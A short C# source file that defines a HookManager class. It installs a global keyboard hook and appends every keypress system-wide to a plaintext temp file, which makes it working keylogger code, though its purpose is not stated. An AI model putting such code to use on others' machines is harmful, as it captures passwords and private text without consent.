using System;
using System.IO;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace ComeBackLuci
{
    public class HookManager : IDisposable
    {
        private IKeyboardMouseEvents M_GlobalHook;
        private string fileData;

        public HookManager()
        {
            string tempFilePath = Path.GetTempFileName();
            string resPath = Path.ChangeExtension(tempFilePath, ".txt");

            File.Move(tempFilePath, resPath);

            SettingsManager.LastFile = resPath;
            SettingsManager.Save();

            fileData = resPath;
        }

        public void Subscribe()
        {
            if (M_GlobalHook != null) return;

            File.WriteAllText(fileData, $"----- {DateTime.Now.ToString("dd/MM/yyyy - hh:mm tt")} -----\n\n");

            M_GlobalHook = Hook.GlobalEvents();
            M_GlobalHook.KeyPress += GlobalHookKeyPress;
        }

        private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            using (StreamWriter sw = new StreamWriter(fileData, true))
            {
                sw.Write(e.KeyChar);
            }
        }

        public void Dispose()
        {
            if (M_GlobalHook != null) M_GlobalHook.KeyPress -= GlobalHookKeyPress;

            M_GlobalHook?.Dispose();
        }
    }
}
